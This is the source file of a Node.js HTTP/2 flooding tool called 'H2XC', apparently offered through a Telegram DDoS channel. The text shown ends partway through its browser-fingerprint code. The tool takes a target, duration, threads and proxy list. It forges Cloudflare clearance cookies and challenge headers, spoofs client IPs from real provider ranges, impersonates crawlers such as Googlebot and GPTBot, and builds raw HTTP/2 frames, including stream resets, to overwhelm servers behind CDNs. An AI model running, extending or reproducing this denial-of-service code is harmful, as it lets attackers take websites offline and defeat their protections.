const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');

process.env.UV_THREADPOOL_SIZE = os.cpus().length * 4;

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e);
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = [];
let rateLimitLogged = false; 
let statuses = {};
let proxyConnections = 0;
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4]);
setTimeout(() => {
    process.exit(1);
}, time * 1000);
const threads = parseInt(process.argv[5]);
const ratelimit = parseInt(process.argv[6]);
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) / 2 : 0;
const connectFlag = process.argv.includes('--connect');
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const fakeBotIndex = process.argv.indexOf('--fakebot');
const fakeBot = fakeBotIndex !== -1 && fakeBotIndex + 1 < process.argv.length ? process.argv[fakeBotIndex + 1].toLowerCase() === 'true' : false;
const authIndex = process.argv.indexOf('--authorization');
const authValue = authIndex !== -1 && authIndex + 1 < process.argv.length ? process.argv[authIndex + 1] : undefined;
const authProxyFlag = process.argv.includes('--auth');
const closeIndex = process.argv.indexOf('--close');
const closeOnError = closeIndex !== -1;
const sleepIndex = process.argv.indexOf('--sleep');
const enableSleep = sleepIndex !== -1 && process.argv[sleepIndex + 1] !== 'false';
const sleepMultiplier = enableSleep ? 3 : 1; // Tăng delay x3 khi bật --sleep
const ratelimitIndex = process.argv.indexOf('--ratelimit');
const enableRateLimit = ratelimitIndex !== -1; 
const randrate = enableRateLimit && ratelimitIndex + 1 < process.argv.length 
         ? process.argv[ratelimitIndex + 1] 
         : undefined;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`

     Thank you For using ${chalk.magenta('H2XC')} - ${chalk.magenta('Update')}: 07/11/2025 - Version: ${chalk.white.bold('2.0')}
     Contact: ${chalk.magenta('Xiin')} ~ ${chalk.underline.blue('t.me/Xin_Kenji')}
     Channel: ${chalk.underline.yellow('t.me/XcDDoZ')}
     ${chalk.blue('Usage:')}
        node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy> [ Options ]
     ${chalk.red('Example:')}
        node ${process.argv} GET https://xcddos.xyz/ 120 16 90 proxy.txt --debug --full --connect 
     ${chalk.yellow('Options:')}
      --randpath 1/2/3 - Query string with rand ex 1 - ?cf__chl_tk 2 - ?randomstring 3 - ?q=fwfwwfwfw
      --cache - Smart cache bypass operation
      --debug - Show status codes requests
      --full - Attack for big backends (Amazon, Akamai, Cloudflare)
      --ratelimit - Automatically handle 429 too many status 
      --connect - Keep proxy connection
      --sleep - Stable rate proxy without breaking
      --fakebot true/false - Use bot User-Agent (TelegramBot, GPTBot, GoogleBot, etc.)
      --auth - Use proxies authorization (format ip:port:username:password)
      --close - Close connections on 403/429

    `);
    process.exit(1);
}
if (!target.startsWith('https://')) {
    console.error('Protocol only supports https://');
    process.exit(1);
}

if (!fs.existsSync(proxyfile)) {
    console.error('Proxy file does not exist');
    process.exit(1);
}

const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(line => {
    const parts = line.split(':');
    if (authProxyFlag) {
        return parts.length === 4 && !isNaN(parts[1]);
    } else {
        return parts.length === 2 && !isNaN(parts[1]);
    }
});

if (proxy.length === 0) {
    console.error('No valid proxy');
    process.exit(1);
}

const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
};
let randomPathSuffix = '';
// up cache query & cache header mỗi 5sec
const cache_bypass = [
    {'cache-control': 'max-age=0'},
    {'pragma': 'no-cache'},
    {'expires': '0'},
    {'x-bypass-cache': 'true'},
    {'x-cache-bypass': '1'},
    {'x-no-cache': '1'},
    {'cache-tag': 'none'},
    {'clear-site-data': '"cache"'},
];
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 3333);
let hcookie = '';
let currentRefererValue = refererValue === 'rand' ? 'https://' + randstr(6) + ".net" : refererValue;
if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}
if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${randstr(6)}=${randstr(6)}` : `${randstr(6)}=${randstr(6)}`;
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);

        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode = 0) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(3, 4);
    frameHeader.writeUInt32BE(streamId, 5);
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, payload]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const legitIP = generateLegitIP();

function generateLegitIP() {
     const subnets = [
            '8.8.8.', '8.8.4.',     // Google DNS
            '1.1.1.', '1.0.0.',     // Cloudflare DNS
            '172.217.', '172.253.', // Google
            '31.13.', '157.240.',   // Facebook
            '104.244.', '199.16.',  // Twitter
            '172.64.', '104.18.'    // Cloudflare
        ];
        
        const subnet = subnets[Math.floor(Math.random() * subnets.length)];
        return subnet + Math.floor(Math.random() * 255);
    }


function generateAlternativeIPHeaders() {
    const headers = {};

    if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
    if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();

    if (Object.keys(headers).length === 0) {
        headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    }

    return headers;
}
function generateDynamicHeaders(fingerprint) {  
    const secChUaFullVersion = `${getRandomInt(120, 133)}.0.${getRandomInt(4000, 6000)}.${getRandomInt(0, 100)}`;
    const platforms = ['Windows', 'macOS', 'Linux'];
    const architectures = ['x86', 'arm', 'arm64'];
    const platformVersion = `${getRandomInt(10, 14)}.${getRandomInt(0, 9)}`;
    const headerOrder = [
        'user-agent',
        'accept',
        'sec-ch-ua',
        'sec-ch-ua-mobile',
        'sec-ch-ua-platform',
        'sec-ch-ua-full-version',
        'accept-language',
        'accept-encoding',
        'sec-fetch-site',
        'sec-fetch-mode',
        'sec-fetch-dest',
        'upgrade-insecure-requests'
    ];

    const dynamicHeaders = {
        'user-agent': fingerprint.navigator.userAgent,  
        'accept': Math.random() > 0.5 
            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
            : 'text/html,application/xhtml+xml,*/*;q=0.9',
        'sec-ch-ua': fingerprint.navigator.sextoy,
        'sec-ch-ua-mobile': Math.random() > 0.5 ? '?1' : '?0',
        'sec-ch-ua-platform': `"${platforms[Math.floor(Math.random() * platforms.length)]}"`,
        'sec-ch-ua-arch': `"${architectures[Math.floor(Math.random() * architectures.length)]}"`,
        'sec-ch-ua-bitness': Math.random() > 0.5 ? '"64"' : '"32"',
        'sec-ch-viewport-width': getRandomInt(800, 2560).toString(),
        'sec-ch-device-memory': [4, 8, 16, 32][Math.floor(Math.random() * 3)].toString(),
        'accept-language': fingerprint.navigator.language,
        'accept-encoding': 'gzip, deflate, br',
        'sec-fetch-site': ['same-origin', 'cross-site'][Math.floor(Math.random() * 2)],
        'sec-fetch-mode': ['navigate', 'cors'][Math.floor(Math.random() * 2)],
        'sec-fetch-dest': ['document', 'script'][Math.floor(Math.random() * 2)],
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
    };

    const orderedHeaders = headerOrder
        .filter(key => dynamicHeaders[key])
        .map(key => [key, dynamicHeaders[key]])
        .concat(Object.entries(generateAlternativeIPHeaders()));

    return orderedHeaders;
}

function generateCfClearanceCookie(fingerprint) {
    const timestamp = Math.floor(Date.now() / 1000);
    const challengeId = crypto.randomBytes(8).toString('hex');
    const clientId = randstr(16);
    const version = getRandomInt(17494, 17500);
    const hashPart = crypto
        .createHash('sha256')
        .update(`${clientId}${timestamp}${fingerprint.ja3}`) 
        .digest('hex')
        .substring(0, 16);
    
    const cookieParts = [
        `${clientId}`,
        `${challengeId}-${version}`,
        `${timestamp}`,
        hashPart
    ];
    
    return `cf_clearance=${cookieParts.join('.')}`;
}
function generateChallengeHeaders(fingerprint) {
    const challengeToken = randstr(32);
    const challengeResponse = crypto
        .createHash('md5')
        .update(`${challengeToken}${fingerprint.canvas}${timestamp}`) 
        .digest('hex');
    
    return [
        ['cf-chl-bypass', '1'],
        ['cf-chl-tk', challengeToken],
        ['cf-chl-response', challengeResponse.substring(0, 16)]
    ];
}

function generateAuthorizationHeader(authValue) {
    if (!authValue) return null;
    const [type, ...valueParts] = authValue.split(':');
    const value = valueParts.join(':');
    if (type.toLowerCase() === 'bearer') {
        if (value === '%RAND%') {
            const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
            const payload = Buffer.from(JSON.stringify({ sub: randstr(8), iat: Math.floor(Date.now() / 1000) })).toString('base64url');
            const signature = crypto.createHmac('sha256', randstr(16)).update(`${header}.${payload}`).digest('base64url');
            return `Bearer ${header}.${payload}.${signature}`;
        }
        return `Bearer ${value.replace('%RAND%', randstr(16))}`;
    } else if (type.toLowerCase() === 'basic') {
        const [username, password] = value.split(':');
        if (!username || !password) return null;
        const credentials = Buffer.from(`${username.replace('%RAND%', randstr(8))}:${password.replace('%RAND%', randstr(8))}`).toString('base64');
        return `Basic ${credentials}`;
    } else if (type.toLowerCase() === 'custom') {
        return value.replace('%RAND%', randstr(16));
    }
    return null;
}

function getRandomMethod() {
    const methods = ['POST', 'HEAD', 'GET'];
    return methods[Math.floor(Math.random() * methods.length)];
}

function generateHTTP2Fingerprint() {
    const settings = {
        HEADER_TABLE_SIZE: [4096, 16384],
        ENABLE_PUSH: [0, 1],
        MAX_CONCURRENT_STREAMS: [50, 100],
        INITIAL_WINDOW_SIZE: [65535, 262144],
        MAX_FRAME_SIZE: [16384, 65536],
        MAX_HEADER_LIST_SIZE: [8192, 32768],
        ENABLE_CONNECT_PROTOCOL: [0, 1]
    };

    const http2Settings = {};
    for (const [key, values] of Object.entries(settings)) {
        http2Settings[key] = values[Math.floor(Math.random() * values.length)];
    }

    return http2Settings;
}
const http2Fingerprint = generateHTTP2Fingerprint();

const browserProfiles = {
  'chrome': {
    ciphers: ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384', 'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384', 'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA', 'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA'],
    signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256', 'ecdsa_secp384r1_sha384', 'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha512'],
    curves: ['X25519', 'secp256r1', 'secp384r1'],
    extensions: ['0', '23', '65281', '10', '11', '35', '16', '5', '13', '18', '51', '45', '43', '27', '17513']
  },
  'firefox': {
    ciphers: ['TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384', 'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384', 'TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA', 'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA', 'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA', 'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA', 'TLS_RSA_WITH_AES_128_GCM_SHA256', 'TLS_RSA_WITH_AES_256_GCM_SHA384'],
    signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'],
    curves: ['secp256r1', 'secp384r1', 'X25519'],
    extensions: ['13', '51', '0', '45', '10', '11', '35', '16', '5', '43', '23', '65281', '18', '27', '17513']
  },
  'edge': {
    ciphers: ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384', 'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384', 'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256', 'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA', 'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA'],
    signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256', 'ecdsa_secp384r1_sha384', 'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384'],
    curves: ['X25519', 'secp256r1', 'secp384r1'],
    extensions: ['0', '5', '10', '11', '13', '16', '18', '23', '27', '35', '43', '45', '51', '17513', '65281']
  }
};

function generateBrowserFingerprint(browserType, ja3Fingerprint) {
    const desktopScreenSizes = [
        { width: 1920, height: 1080 },
        { width: 2560, height: 1440 },
        { width: 1366, height: 768 },
        { width: 3840, height: 2160 }
    ];

    const mobileScreenSizes = [
        { width: 360, height: 640 },
        { width: 414, height: 896 },
        { width: 375, height: 812 },
        { width: 412, height: 915 },
        { width: 390, height: 844 }
    ];

    const languages = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8",
        "es-ES,es;q=0.9",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "zh-CN,zh;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8"
    ];

    const desktopWebGLVendors = [
        { vendor: 'Google Inc. (NVIDIA)', renderer: 'ANGLE (NVIDIA, NVIDIA GeForce RTX 4060, Direct3D11 vs_5_0 ps_5_0)' },
        { vendor: 'Google Inc. (AMD)', renderer: 'ANGLE (AMD, AMD Radeon RX 7600, Direct3D11 vs_5_0 ps_5_0)' },
        { vendor: 'Google Inc. (Intel)', renderer: 'ANGLE (Intel, Intel(R) UHD Graphics 630, OpenGL 4.6 (Core Profile) Mesa)' }
    ];

    const mobileWebGLVendors = [
        { vendor: 'Google Inc. (Qualcomm)', renderer: 'ANGLE (Qualcomm, Adreno (TM) 660, OpenGL ES 3.2)' },
        { vendor: 'Google Inc. (ARM)', renderer: 'ANGLE (ARM, Mali-G78 MP14, OpenGL ES 3.2)' },
        { vendor: 'Google Inc. (Apple)', renderer: 'ANGLE (Apple, Apple A17 Pro GPU, OpenGL ES 3.0)' }
    ];

    const tlsVersions = ['771', '772', '773'];
    const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];

    let rdversion = getRandomInt(126, 133);

    const botUserAgents = [
        'Cpanel-HTTP-Client/1.0',
        'TelegramBot (like TwitterBot)',
        'GPTBot/1.0 (+https://openai.com/gptbot)',
        'GPTBot/1.1 (+https://openai.com/gptbot)',
        'OAI-SearchBot/1.0 (+https://openai.com/searchbot)',
        'ChatGPT-User/1.0 (+https://openai.com/bot)',
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/W.X.Y.Z Safari/537.36',
        'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Twitterbot/1.0',
        'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
        'Slackbot',
        'Discordbot/2.0 (+https://discordapp.com)',
        'DiscordBot (private use)',
        'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
        'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)',
        'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
        'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
        'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)',
        'Mozilla/5.0 (compatible; Google-Extended/1.0; +https://developers.google.com/search/docs/crawling-indexing/google-extended)',
        'Mozilla/5.0 (compatible; Pinterestbot/1.0; +https://www.pinterest.com/bot.html)',
        'Mozilla/5.0 (compatible; ClaudeBot/1.0; +claude.ai)',
        `Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/${rdversion}.0.0.0 Safari/537.36`
   ];

    const chromeDesktopUAs = [
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`
    ];

    const chromeMobileUAs = [
        `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${rdversion}.0.0.0 Mobile/15E148 Safari/604.1`,
        `Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Mobile Safari/537.36`,
        `Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${rdversion}.0.0.0 Mobile/15E148 Safari/604.1`
    ];

    const firefoxDesktopUAs = [
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${rdversion}.0) Gecko/20100101 Firefox/${rdversion}.0`,
        `Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:${rdversion}.0) Gecko/20100101 Firefox/${rdversion}.0`,
        `Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:${rdversion}.0) Gecko/20100101 Firefox/${rdversion}.0`
    ];

    const firefoxMobileUAs = [
        `Mozilla/5.0 (Android 14; Mobile; rv:${rdversion}.0) Gecko/${rdversion}.0 Firefox/${rdversion}.0`,
        `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/${rdversion}.0 Mobile/15E148 Safari/605.1.15`
    ];

    const edgeDesktopUAs = [
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36 Edg/${rdversion}.0.0.0`,
        `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36 Edg/${rdversion}.0.0.0`
    ];

    const edgeMobileUAs = [
        `Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Mobile Safari/537.36 EdgA/${rdversion}.0.0.0`,
        `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/${rdversion}.0.0.0 Mobile/15E148 Safari/605.1.15`
    ];

    let userAgent;
    let sextoy;
    let isMobile = Math.random() > 0.5; 
    let screenSizes = isMobile ? mobileScreenSizes : desktopScreenSizes;
    let webGLVendors = isMobile ? mobileWebGLVendors : desktopWebGLVendors;

    if (fakeBot) {
        userAgent = botUserAgents[Math.floor(Math.random() * botUserAgents.length)];
        sextoy = '"Not A;Brand";v="99", "Chromium";v="130"';
        isMobile = /Mobile|Android|iPhone/.test(userAgent);  
        screenSizes = isMobile ? mobileScreenSizes : desktopScreenSizes;
        webGLVendors = isMobile ? mobileWebGLVendors : desktopWebGLVendors;
    } else {
        if (browserType === 'chrome') {
            userAgent = isMobile 
                ? chromeMobileUAs[Math.floor(Math.random() * chromeMobileUAs.length)] 
                : chromeDesktopUAs[Math.floor(Math.random() * chromeDesktopUAs.length)];
            sextoy = `"Google Chrome";v="${rdversion}", "Chromium";v="${rdversion}", "Not?A_Brand";v="24"`;
        } else if (browserType === 'firefox') {
            userAgent = isMobile 
                ? firefoxMobileUAs[Math.floor(Math.random() * firefoxMobileUAs.length)] 
                : firefoxDesktopUAs[Math.floor(Math.random() * firefoxDesktopUAs.length)];
            sextoy = `"Firefox";v="${rdversion}", "Gecko";v="${rdversion}"`;
        } else if (browserType === 'edge') {
            userAgent = isMobile 
                ? edgeMobileUAs[Math.floor(Math.random() * edgeMobileUAs.length)] 
                : edgeDesktopUAs[Math.floor(Math.random() * edgeDesktopUAs.length)];
            sextoy = `"Microsoft Edge";v="${rdversion}", "Chromium";v="${rdversion}", "Not?A_Brand";v="24"`;
        }
    }

    const screen = screenSizes[Math.floor(Math.random() * screenSizes.length)];
